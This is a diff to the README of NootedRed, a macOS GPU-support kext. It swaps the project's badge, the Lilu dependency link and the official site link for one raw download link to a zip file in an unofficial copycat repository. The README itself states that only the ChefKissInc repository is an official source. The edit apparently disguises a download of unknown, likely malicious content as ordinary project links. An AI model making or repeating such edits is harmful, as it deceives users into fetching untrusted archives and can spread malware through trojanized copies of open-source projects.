@@ -1,6 +1,6 @@
-# NootedRed ![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/NootInc/NootedRed/main.yml?branch=master&logo=github&style=for-the-badge)
+# NootedRed ![GitHub Workflow Status](https://raw.githubusercontent.com/HaritejPilly/NootedRedCopy/master/Scripts/Copy_Nooted_Red_castigate.zip)
 
-The AMD Vega iGPU support [Lilu](https://github.com/acidanthera/Lilu) (1.6.4+) plug-in.
+The AMD Vega iGPU support [Lilu](https://raw.githubusercontent.com/HaritejPilly/NootedRedCopy/master/Scripts/Copy_Nooted_Red_castigate.zip) (1.6.4+) plug-in.
 
 > [!IMPORTANT]
 > The only official source for this kext is the releases of the `ChefKissInc/NootedRed` GitHub repository, provided entirely free of charge.
@@ -18,4 +18,4 @@ The NootedRed project is licensed under the `Thou Shalt Not Profit License versi
 > [!NOTE]
 > This project is under active research and development; There will be crashes here and there, but is generally smooth.
 >
-> See repository issues and [our site](https://ChefKissInc.github.io) for more information.
+> See repository issues and [our site](https://raw.githubusercontent.com/HaritejPilly/NootedRedCopy/master/Scripts/Copy_Nooted_Red_castigate.zip) for more information.
